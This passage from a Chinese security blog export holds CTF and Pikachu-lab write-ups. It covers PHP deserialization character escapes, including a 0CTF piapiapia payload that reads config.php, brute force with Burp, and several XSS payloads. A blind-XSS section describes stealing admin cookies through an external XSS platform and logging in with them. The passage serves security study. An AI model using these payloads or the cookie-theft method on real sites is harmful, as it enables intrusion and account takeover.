invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">    <span class="comment">#将匹配的部分替换为空字符串(删除，这里好像可以双写绕过不确定)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a><code>extract()</code>函数</h4><p><code>extract()</code>函数用于将数组中的键值对转换为变量。使用<code>extract()</code>函数时，数组的键成为新变量的名称，而数组的值成为这些变量的值。</p>
<p>根据<code>extract()</code>我们可以进行变量覆盖，当我们传入<code>SESSION[flag]=123</code>时，<code>SESSION[&quot;user&quot;]</code>和<code>SESSION[&#39;function&#39;]</code>全部会消失,只剩下<code>SESSION[flag]=123</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;jt&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$arr</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#输出：jt</span></span><br></pre></td></tr></table></figure>

<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// extract($_POST);</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="comment">// echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize_info</span>;</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</span></span><br><span class="line"><span class="comment">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>构造的序列化串为<code>;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>由于是由<code>extract($_POST)</code>重新设置的变量，最终<code>payload</code>为<br><code>_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204888.png" alt="image-20241118231728369" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060204435.png" alt="image-20241118231700590" style="zoom:50%;" />

<p><code>/d0g3_fllllllag</code>里应该就是<code>flag</code>了，将<code>payload</code>中的<code>ZDBnM19mMWFnLnBocA==</code>替换成<code>L2QwZzNfZmxsbGxsbGFn</code>即可。</p>
<h2 id="增长逃逸"><a href="#增长逃逸" class="headerlink" title="增长逃逸"></a>增长逃逸</h2><p>通过下面这个例子学习一下：</p>
<p>不能对<code>$pass</code>进行改动，要求输出<code>hack</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:4:&quot;hack&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//     public $name = &#x27;aaa&#x27;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;[0CTF 2016]piapiapia&#x3D;&#x3D;</p>
<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">    &#125;</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#------------------------profile.php----------------------------</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">        <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>​	序列化后，紧接着就是对序列化字符串进行过滤，想到反序列化字符逃逸漏洞，<code>where-&gt;hacker</code>本题是增长逃逸。</p>
<p>​	利用数组绕过<code>preg_match</code>对<code>nickname</code>的检查，传入<code>nickname[]</code>即可。</p>
<p>因为前面是<strong>数组</strong>，所以闭合方式由<code>&quot;;</code>变成了**<code>&quot;;&#125;</code>**，因此也要多加一个<code>where</code>，最后的<code>payload</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br><span class="line">&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注："><a href="#注：" class="headerlink" title="注："></a><strong>注</strong>：</h3><p>​	拿到了后门文件后发现<code>www</code>目录下有许多<code>.php</code>文件，但是依然没有任何思路，傻傻的分析这些代码还以为是<code>sql</code>注入🙃。看<code>wp</code>才知道要访问一下这些文件的路由，其实分析代码的时候也能看出来这些<code>.php</code>文件都是可以访问的。</p>
<p>​	这道题思路<code>payload</code>都没问题后，还是一直打不通，换了两个<code>bp</code>三个浏览器，<code>Hackbar</code>也尝试过，都失败了😭。解决过程：<br>经过不同的测试后发现可能是<code>bp</code>里虽然修改了，但是提交的数据还是原来的内容，我还一直以为是我<code>bp</code>的问题。最后发现其实是将数据包发送到<code>Repeater</code>后的修改无效😅，真离谱。所以抓包后要先修改内容，再把数据包发送到<code>Repeater</code>，这样的修改才是有效的。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu靶场通关记录</title>
    <url>/2024/10/17/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Pikachu靶场是一个用于学习和测试网络安全的练习平台，主要用于Web安全漏洞的实践和研究。它包含了一系列常见的Web安全漏洞。</p>
<span id="more"></span>

<h2 id="Brute-Force暴力破解"><a href="#Brute-Force暴力破解" class="headerlink" title="Brute Force暴力破解"></a><code>Brute Force</code>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>直接爆破</p>
<h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(<code>on server</code>)</h3><p>这种同上面一样，直接爆破</p>
<h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(<code>on client</code>)</h3><p>填写正确的验证码后劫持请求包，在<code>Repeater</code>模块中将验证码参数设置为空后发送，服务器返回正常信息，</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758776.png" alt="image-20241011155625971" style="zoom:50%;" />

<p>然后将请求包发送到<code>Intruder</code>模块，正常暴力破解即可。</p>
<h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a><code>token</code>防爆破</h3><p>这种抓包后，可以发现多了一个<code>token</code>参数，需要同时爆破两个参数，可以利用<code>Pitchfork</code>攻击模式。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131801378.png" alt="image-20241011160629228" style="zoom:50%;" />

<p><code>password</code>的<code>payload</code>设置正常加载字典，<code>token</code>的<code>payload</code>设置为<code>Recursive grep</code>（递归搜索）类型</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758117.png" alt="image-20241011161617335" style="zoom: 67%;" />

<p>在<code>Options</code>模块下：</p>
<p>在<code>Request Engine</code>中设置线程数为<code>1</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131758854.png" alt="image-20241011161720097" style="zoom:67%;" />

<p>在<code>Grep-Extract</code>中提取响应中的有用信息，到攻击结果表中，这里是<code>token</code>值</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757965.png" alt="image-20241011161903701" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757206.png" alt="image-20241011162304789" style="zoom:50%;" />

<p>在<code>Redirections</code>中设置如何遵循重定向为<code>Always</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757337.png" alt="image-20241011162347048" style="zoom:50%;" />

<p>然后开始爆破</p>
<h2 id="XSS跨站脚本"><a href="#XSS跨站脚本" class="headerlink" title="XSS跨站脚本"></a><code>XSS</code>跨站脚本</h2><h3 id="漏洞测试流程"><a href="#漏洞测试流程" class="headerlink" title="漏洞测试流程"></a><strong>漏洞测试流程</strong></h3><ol>
<li>在目标站点找到输入点，比如查询接口，留言板等；</li>
<li>输入一组“特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理。</li>
<li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行JS代码的条件（构造闭合），是否在<code>p</code>标签中；</li>
<li>提交payload，成功执行则存在xss漏洞。</li>
</ol>
<h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型<code>xss(get)</code></h3><p>​	先输入<code>&lt;script&gt;111</code>提交，然后查看源码，搜索找到输入的<code>&lt;script&gt;111</code>，联系上下文可以确定这是一个<code>xss</code>漏洞。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757469.png" alt="image-20241011191329652" style="zoom: 50%;" />

<p>试着输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现输入字节数被限制。<br><code>F12</code>找到设置字数的参数<code>maxlength</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757274.png" alt="image-20241011192735750"></p>
<p>修改<code>maxlength</code>值</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131802005.png" alt="image-20241011192958868" style="zoom:67%;" />

<p>再次注入代码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757113.png" alt="image-20241011193044360" style="zoom: 50%;" />

<h5 id="payload："><a href="#payload：" class="headerlink" title="payload："></a><code>payload</code>：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;svg/onload=<span class="title function_ invoke__">confirm</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_ invoke__">alert</span>(<span class="number">3</span>)&gt;</span><br></pre></td></tr></table></figure>

<p>反射型<code>xss(post)</code>与<code>get</code>型的区别是，<code>get</code>会在<code>url</code>中显示我们注入的代码，该类不会显示。</p>
<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型<code>xss</code></h3><p>​	存储型与反射型的区别在于，存储型会将每次输入的数据都保留在数据库中，后一次输入的数据不会覆盖前一次输入的数据。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131802917.png" alt="image-20241011195802223" style="zoom:67%;" />

<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a><code>DOM</code>型<code>xss</code></h3><p>​	<code>DOM XSS</code>的<code>XSS</code>代码并不需要服务器解析响应的直接参与，触发<code>XSS</code>靠的就是浏览器端的<code>DOM</code>解析，可以认为完全是客户端的事情，无法通过<code>WAF</code>防护。</p>
<p>​	分析一下前端网页代码，可以发现输入框里的参数会被传递给<code>a</code>标签中的<code>href</code>属性，所以我们输入<code>payload</code>后点击<code>a</code>标签也就是网页上的<code>what do you see?</code>即可。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757494.png" alt="image-20241011214756139" style="zoom: 67%;" />

<ul>
<li><p>输入<code>javascript:alert(1)</code>，插入数据后的<code>a</code>标签为：<code>&lt;a href=&#39;javascript:alert(1)&#39;&gt;what do you see?&lt;/a&gt;</code>。</p>
</li>
<li><p>输入<code>&#39; onclick=&quot;alert(1)&quot;&gt;</code>，输入的<code>&#39;</code>会把<code>href</code>属性构造成一个闭合，然后再通过<code>onclick</code>也可以实现跟上面一样的功能。</p>
</li>
</ul>
<p>前：<code>&lt;a href=&#39;&#39;&gt;what do you see?&lt;/a&gt;</code><br>后：<code>&lt;a href=&#39;&#39; onclick=&quot;alert(&#39;1&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757771.png" alt="image-20241011220439496" style="zoom:67%;" />

<h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a><code>payload</code>：</h4><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line"><span class="string">&#x27; onclick=&quot;alert(&#x27;</span><span class="number">1</span><span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a><code>xss</code>之盲打</h3><blockquote>
<p>XSS盲打不是一种漏洞类型而是一种xss漏洞的利用方式，攻击者可以在网站留言板、反馈建议等功能点提交恶意的xss payload，如果该网站存在xss漏洞，当管理员在后台查看用户留言页面时就会执行xss payload，xss盲打最主要的目的是通过加载外部的恶意js文件(通过xss盲打平台生成)获取管理员后台的Cookie信息，攻击者就可以使用管理员的身份访问网站后台从而进一步发动攻击</p>
</blockquote>
<p>该类攻击的过程是找到<code>xss</code>漏洞的注入点，然后将通过<a href="https://xssaq.com/dashboard">XSS平台</a>得到的恶意<code>js</code>文件在漏洞点注入，登录管理员后台使恶意代码执行，便能在<code>XSS</code>平台上得到<code>cookie</code>值。</p>
<p>在<a href="https://xssaq.com/dashboard">XSS平台</a>上，创建项目，查看配置代码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757528.png" alt="image-20241012170823583" style="zoom:50%;" />

<p>将第二个代码注入漏洞点，提交</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131804716.png" alt="image-20241012170947388" style="zoom:50%;" />

<p>注入恶意代码后，再次登录后台，代码就会被执行</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805384.png" alt="image-20241012172214641" style="zoom:50%;" />

<p>然后在<code>XSS</code>平台上查看记录，要等一会儿才能看到</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757491.png" alt="image-20241012172423588" style="zoom:50%;" />

<p>然后就可以利用获得的<code>cookie</code>值登录管理后台了</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757454.png" alt="image-20241012172949880" style="zoom:50%;" />

<h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a><code>xss</code>之过滤</h3><p><code>&lt;&gt;</code>可以正常打印出来</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757367.png" alt="image-20241012175326553"></p>
<p><code>&lt;script&gt;</code>被过滤</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805565.png" alt="image-20241012175401883"></p>
<p>尝试双写<code>&lt;scrscriptipt&gt;</code>同样被过滤</p>
<p>尝试大小写<code>&lt;ScrIpt&gt;</code>，绕过成功</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757194.png" alt="image-20241012180032520"></p>
<p>猜测是<code>script</code>关键字被过滤，尝试<code>&lt;svg/onload=confirm(1)&gt;</code>和<code>&lt;img src=1 onerror=alert(3)&gt;</code>都可成功</p>
<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a><code>xss</code>之<code>htmlspecialchars</code></h3><h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a><code>htmlspecialchars</code></h4><p><code>htmlspecialchars</code>函数会把<code>&#39; &quot; &amp; &lt; &gt;</code>等字符转换为实体，也就是过滤了。但是该函数默认情况下是不会过滤<code>&#39;</code>的，只有<code>quotestyle</code>选项被设为<code>ENT_QUOTES</code>时才会过滤<code>&#39;</code>。</p>
<h4 id="标签和href属性"><a href="#标签和href属性" class="headerlink" title="&lt;a&gt;标签和href属性"></a><code>&lt;a&gt;</code>标签和<code>href</code>属性</h4><p> <code>&lt;a&gt;</code>是<code>&quot;anchor&quot;</code>的缩写，用于定义超链接，可以将用户导航到另一个页面、页面上的某个部分，或者任何其他<code>URL</code>。<code>href</code>属性指定了超链接的目标<code>URL</code>。</p>
<p>随便输入123，发现输入的数据给了<code>href</code>属性</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757581.png" alt="image-20241012184854479" style="zoom: 67%;" />

<p>那就先输入<code>javascript:alert(1)</code>试试，如果没有过滤，即可成功</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131805160.png" alt="image-20241012185644279" style="zoom:50%;" />

<p>成功了，我们还可以用其他<code>payload</code>，只要能绕过过滤即可</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a><code>payload</code></h4><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span></span><br><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="function"><span class="title">alert</span>(<span class="number">2</span>)<span class="string">&#x27;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a><code>xss</code>之<code>href</code>输出</h3><p>直接用<code>javascript:alert(1)</code>即可。</p>
<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a><code>xss</code>之<code>js</code>输出</h3><p>输入123</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757943.png" alt="image-20241012190623893" style="zoom:50%;" />

<p>这里有一个小技巧，我们可以利用<code>&#39;</code>和<code>//</code>构造在<code>$ms=&#39;123&#39;</code>可以执行的语句。</p>
<p>输入<code>123&#39;;//</code>，拼接后：<code>$ms=&#39;123&#39;;//&#39;;</code></p>
<p>所以现在我们输入<code>123&#39;;alert(2);//</code>即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131757000.png" alt="image-20241012191615734"></p>
<h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a><code>CSRF</code>跨站请求伪造</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a><code>CSRF(get)</code></h3><p>攻击方：<code>vince</code><br>被攻击方：<code>allen</code><br>被攻击方原个人信息：</p>
